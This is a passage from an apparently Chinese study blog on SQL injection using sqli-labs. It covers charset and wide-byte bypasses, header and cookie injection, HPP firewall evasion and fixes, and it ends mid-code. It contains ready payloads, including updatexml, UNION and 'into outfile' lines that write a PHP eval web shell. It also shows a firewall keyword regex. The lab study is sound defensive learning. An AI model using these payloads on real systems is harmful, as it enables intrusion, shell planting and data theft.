时，因为 utf8 是三个字节，他不认识这个两个字节和一个字节的玩意，自动忽略，扔给 latin1 时还是 admin，因此服务端正常查询</p>\n<p>一但 % e4% bd% ac 输入完整后，这三个字节拼成了佬，现在 utf8 认识了，传给服务端的时候变成了 admin 佬，现在 latin1 不认识了，开始报错</p>\n<p>这就是这三个前两个可以正常查询，但第三个报错的原因</p>\n<p>继续查询，我们发现只有部分字符可以正常查询出结果，但有些不能</p>\n<p>比如 admin% c2 可以，但 admin% c1 就不行，经过师傅的测试，有如下结果</p>\n<blockquote>\n<ol>\n<li>\\x00 <code>~</code> \\x7F`： 返回空白结果</li>\n<li><code>\\x80</code> ~ <code>\\xC1</code> ： 返回错误 Illegal mix of collations</li>\n<li><code>\\xC2</code> ~ <code>\\xEF</code> ： 返回 admin 的结果</li>\n<li><code>\\xF0</code> ~ <code>\\xFF</code> ： 返回错误 Illegal mix of collations</li>\n</ol>\n</blockquote>\n<p>UTF-8 编码是变长编码，可能有 1~4 个字节表示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022172222480.png\" alt=\"image-20221022172222480\"></p>\n<p>然后根据 RFC 3629 规范，又有一些字节值是不允许出现在 UTF-8 编码中的：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db28c7b4-4dc9-4592-9fc7-23f0290c3892.6e734d61aa73.jpg\" alt=\"14917445720884.jpg\"></p>\n<p>所以最终，UTF-8 第一字节的取值范围是：00-7F、C2-F4，这也是我在 admin 后面加上 80-C1、F5-FF 等字符时会抛出错误的原因。</p>\n<p>那么，为什么 <code>username=admin%F0</code>  也不行呢？F0 是在 C2-F4 的范围中呀？</p>\n<p>这又涉及到 Mysql 中另一个特性：<strong>Mysql 的 utf8 其实是阉割版 utf-8 编码，Mysql 中的 utf8 字符集最长只支持三个字节</strong>，</p>\n<p>F0-F4 是四字节才有的，所以我传入 <code>username=admin%F0</code>  也将抛出错误。</p>\n<p>如果你需要 Mysql 支持四字节的 utf-8，可以使用 <code>utf8mb4</code>  编码。我将原始代码中的 set names 改成 <code>set names utf8mb4</code> ，就可以正常查询了</p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对于php和mysql之间的编码问题，post和get方法是不一样的，post不用URL编码，可以直接用latin文字绕过</span><br><span class=\"line\">get需要利用到mysql字符集之间的转换，同时还要对utf8的字节范围熟悉，这样在utf8-utf9-latin1时就可以利用编码转换逃逸了</span><br><span class=\"line\">同时注意mysql的utf8是三个字节的，要是想用f0-f4需要把编码变为utf8mb4</span><br><span class=\"line\">utf8mb4是个好东西，还能防宽字节，下面会有详细描述</span><br></pre></td></tr></table></figure>\n<p>参考 p 师傅博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20=\">https://www.leavesongs.com</span></p>\n<h5 id=\"referer注入\"><a class=\"markdownIt-Anchor\" href=\"#referer注入\">#</a> referer 注入</h5>\n<p>通过 referer 字段不严格的过滤产生注入</p>\n<p>phpcmsv9 存在 referer 注入</p>\n<p>sqllab pass-19</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175006708.png\" alt=\"image-20220311175006708\"></p>\n<p>通过闭合确定 referer 存在注入</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>构造如下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">Referer: 1&#x27; and updatexml(1,(concat(0x7e,user(),0x7e)),1),&#x27;127.0.0.100&#x27;)#</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175111332.png\" alt=\"image-20220311175111332\"></p>\n<p>注意题目源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class=\"line\">闭合时需要在闭合一个括号</span><br></pre></td></tr></table></figure>\n<h5 id=\"user-agent注入\"><a class=\"markdownIt-Anchor\" href=\"#user-agent注入\">#</a> user-agent 注入</h5>\n<p>参考 sqllab 第 18 关</p>\n<p>1. 关于 sql 参数过滤，check_input 用于检查输入的内容。</p>\n<p>第二个 if 判断魔术开关是否打开，如果打开，则去除转义字符。魔术开关用于给特定的字符加转义字符</p>\n<p>如果没有开魔术开关，则使用 mysql_real_escape_string 转义特殊字符。如果不写<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>s</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">value = stripslashes(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>value); 会导致由于魔术开关增加一次转义字符，mysql_real_escape_string 又会增加一次转义字符，双重转义导致转义失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_input($value)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tif(!empty($value))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t// truncation (see comments)</span><br><span class=\"line\">\t\t$value = substr($value,0,20);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Stripslashes if magic quotes enabled</span><br><span class=\"line\">\t\tif (get_magic_quotes_gpc())</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = stripslashes($value);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Quote if not a number</span><br><span class=\"line\">\t\tif (!ctype_digit($value))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t$value = intval($value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\treturn $value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数据库中接收参数的语句为 </span><br><span class=\"line\">\t$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class=\"line\">\t$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png\" alt=\"image-20220311173048631\"></p>\n<p>0. 数据库中闭合语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>\n<p>最终 payload 有两种形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1),&#x27;127.0.0.1&#x27;,&#x27;sb&#x27;)#</span><br><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐</span><br><span class=\"line\">//但加如)后会导致列数不匹配,后面还需要补充两列</span><br></pre></td></tr></table></figure>\n<p>也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的</p>\n<h5 id=\"cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入\">#</a> cookie 注入</h5>\n<p>通过没有过滤 cookie 字段的值产生的 cookie 注入</p>\n<p>sqllab pass-20，21，22</p>\n<p>注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie。只有提交正确的用户名和密码才能到 if 中 setcookie</p>\n<p>后续在第二个包中注入，没有设置 submit 时会进第二个 if 走 select 查询</p>\n<p>验证存在注入：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png\" alt=\"image-20220311175929845\"></p>\n<p>进行注入：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png\" alt=\"image-20220311180121906\"></p>\n<p>最终构造的 paylaod 为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>不加 <code>)</code>  的原因是他的查询语句长这样：</p>\n<p>​      <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mo>∗</mo><mi>F</mi><mi>R</mi><mi>O</mi><mi>M</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>W</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></mrow><annotation encoding=\"application/x-tex\">sql=&quot;SELECT * FROM users WHERE username=&#x27;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span>cookee’ LIMIT 0,1&quot;;</p>\n<p>你只需要闭合 <code>'</code>  不再需要闭合 <code>)</code></p>\n<h5 id=\"post注入\"><a class=\"markdownIt-Anchor\" href=\"#post注入\">#</a> post 注入</h5>\n<p>通过 post 提交的参数中注入</p>\n<p>postman,hackbar,burpsuite 可以提交 post 参数</p>\n<p>sqllabs less11  - less14</p>\n<p>sqli - less11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=-1&#x27; union select 1,2#&amp;passws=1111</span><br></pre></td></tr></table></figure>\n<p>sqlmap 两种形式</p>\n<p>1. 将 http 请求包放入 txt 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 1.txt</p>\n<p>2.sqlmap -u URL --data “”</p>\n<h5 id=\"sql读写文件注入\"><a class=\"markdownIt-Anchor\" href=\"#sql读写文件注入\">#</a> SQL 读写文件注入</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select into outfile  导出数据</span><br><span class=\"line\">?id=-1&#x27; union select &lt;?php eval($_POST[&#x27;C&#x27;]);?&gt; into outfile E:/web.php</span><br><span class=\"line\"></span><br><span class=\"line\">outfile 导出条件</span><br><span class=\"line\">root权限</span><br><span class=\"line\">GPC关闭（能使用单引号)</span><br><span class=\"line\">有绝对路径（读文件可以不用，写文件必须)</span><br><span class=\"line\">没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27;)) union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &#x27;网站物理路径&#x27; --+</span><br><span class=\"line\">less-7/demo.php</span><br><span class=\"line\">?id=1&#x27;)) union select 1,2, &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; into outfile &quot;D:/Phpstudy/PHPTutorial/test1.php --+</span><br><span class=\"line\">写马的时候必须使用字符串</span><br></pre></td></tr></table></figure>\n<h5 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h5>\n<p>导致原因： <code>mysql_query(&quot;set names gbk&quot;)</code>  错误使用了编码方式 <code>gbk</code></p>\n<p>一个 <code>gbk</code>  编码汉字，占用 2 个字节。一个 <code>utf-8</code>  编码的汉字，占用 3 个字节。</p>\n<p>假设我们有以下代码，并且我们的 <code>magic_quotes_gpc</code>  是关闭的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span><br><span class=\"line\">$conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;toor!@#$&#x27;) or die(&#x27;bad!&#x27;);</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_select_db(&#x27;test&#x27;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class=\"line\">//执行sql语句</span><br><span class=\"line\">$id = isset($_GET[&#x27;id&#x27;]) ? addslashes($_GET[&#x27;id&#x27;]) : 1;</span><br><span class=\"line\">$sql = &quot;SELECT * FROM news WHERE tid=&#x27;&#123;$id&#125;&#x27;&quot;;</span><br><span class=\"line\">$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset=&quot;gbk&quot; /&gt;</span><br><span class=\"line\">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class=\"line\">echo &quot;&lt;h2&gt;&#123;$row[&#x27;title&#x27;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&#x27;content&#x27;]&#125;&lt;p&gt;\\n&quot;;</span><br><span class=\"line\">mysql_free_result($result);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>如果我们想注入，那么必须绕过 <code>addslashes</code>  的过滤，我们可以有两种思路：</p>\n<blockquote>\n<p>1. 想办法给 <code>\\</code>  前面再加一个 <code>\\</code> （或单数个即可），变成 <code>\\\\'</code> ，这样 <code>\\</code>  被转义了， <code>'</code>  逃出了限制</p>\n<p>2. 想办法把 <code>\\</code>  弄没有。</p>\n</blockquote>\n<p>我们先说把 <code>\\</code>  弄没有的情况</p>\n<p>mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个 ascii 码要大于 128，才到汉字的范围）。如果我们输入 <code>%df'</code>  看会怎样：</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''111ß\\''' at line 1</code></p>\n<p>此时出现报错，说明存在注入</p>\n<p>这就是 mysql 的特性，因为 <code>gbk</code>  是多字节编码，他认为两个字节代表一个汉字，所以 <code>%df</code>  和后面的 <code>addslash</code>  加的 <code>\\</code>  也就是 <code>%5c</code>  变成了一个汉字 <code>運</code> ，而 <code>'</code>  逃逸了出来。</p>\n<p>因为两个字节代表一个汉字，所以我们可以试试 <code>%df%df%27</code> ：</p>\n<p>此时不报错了， <code>%df%df</code>  拼成了一个汉字， <code>%5c%27</code>  因为 <code>27</code>  不大于 128，不构成汉字。所以根据这个特性，我们用 <code>1%a1'</code>  也可以。</p>\n<p><code>%a1%5c</code>  他可能不是汉字，但一定会被 mysql 认为是一个宽字符，就能够让后面的 <code>%27</code>  逃逸了出来。</p>\n<p>但如果我们把 gbk 换成 gb2312，我们的 <code>%df%5c%27</code>  又不能注入了</p>\n<p>这归结于 gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 <code>0xA1~0xFE</code> ，而 <code>\\</code>  是 0x5c，是不在低位范围中的。所以， <code>0x5c</code>  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。</p>\n<p>为了解决宽字节注入，有些 cms 会用 mysql_real_escape_string 抵御，但如果我们去使用 % df，他依然会被打穿</p>\n<p>原因就是，你没有指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案1</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_real_escape_string</span><br></pre></td></tr></table></figure>\n<p>第二个解决方案就是，将 character_set_client 设置为 binary（二进制）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案2</span><br><span class=\"line\">//只需在所有sql语句前指定一下连接的形式是二进制：</span><br><span class=\"line\">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>\n<p>我们将 character_set_client 设置成 binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>\n<p>接下来是双重转义的情况 —iconv 导致的致命后果</p>\n<p>(划重点，好好看，后面 file include 中会考这个函数)</p>\n<p>有些 cms 会使用如下字符集转换函数防止乱码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>当我们输入 <code>錦'</code>  时，他又报错了，它的 utf-8 编码是 <code>0xe98ca6</code> ，它的 gbk 编码是 <code>0xe55c</code></p>\n<p>当他从 utf8 转成 gbk 时，变成了 <code>%e5%5c%27</code> ，这时多管闲事的 addslashes 又送来了一个 <code>\\</code> ，变成了 <code>%e5%5c%5c%27</code> ，两个 5c 形成了双重转义，对 <code>'</code>  的转义失效，注入产生</p>\n<p>如果我们此时从 gbk 转为 utf8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>我们再次输入 <code>%aa'</code> ，注入又发生了，因为从 gbk 转为 utf8 时，php 会两个字节一转换，一旦 <code>\\</code>  前面的字符是奇数， <code>\\</code>  就会被吞掉， <code>'</code>  逃逸</p>\n<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个姿势？</p>\n<p>对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， <code>\\</code> （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\\</code>  则 php 会报错：</p>\n<p>而 <code>\\</code>  会出现在 gbk 中，所以从 gbk 转为 utf8 会吞掉 \\</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vbXV0aWJ5dGUtc3FsLWluamVjdC5odG1s\">浅析白盒审计中的字符编码及 SQL 注入 | 离别歌 (leavesongs.com)</span></p>\n<p>sqllab less-32</p>\n<p>注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png\" alt=\"image-20220316223957869\"></p>\n<h5 id=\"hpp参数污染\"><a class=\"markdownIt-Anchor\" href=\"#hpp参数污染\">#</a> HPP 参数污染</h5>\n<p>sqllabs less 29:</p>\n<p>在 login.php 中，如果我们尝试闭合会产生报错，这关考点是 hpp 参数污染</p>\n<p>对于当有多个 key 相同的参数时，不同服务器获取参数与情况</p>\n<p>?id=1&amp;id=10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png\" alt=\"image-20220316200748174\"></p>\n<p><strong>php 对于两个相同 key 的参数，取第二个</strong></p>\n<p>因此由于我们的环境是 php+Apache，只会接收第二个参数，我们只需要在第二个参数中注入，第一个参数可以随意提交，但 waf 过滤的却是第一个参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:18888/sqli/Less-29/login.php?id=1&amp;id=-2%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"通过hppphp绕过贷齐乐waf\"><a class=\"markdownIt-Anchor\" href=\"#通过hppphp绕过贷齐乐waf\">#</a> 通过 HPP+PHP 绕过贷齐乐 waf</h6>\n<p>此处的 waf 会经过两层过滤，第一层过滤</p>\n<p>/core/sqlin.inc.php，包含在 config.inc.php 中，所有请求都会经由此类过滤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class sqlin &#123;</span><br><span class=\"line\">\tfunction dowith_sql($str) &#123;</span><br><span class=\"line\">\t\t$check= eregi(&#x27;select|insert|update|delete|\\&#x27;|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile&#x27;, $str);</span><br><span class=\"line\">\t\tif($check)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span 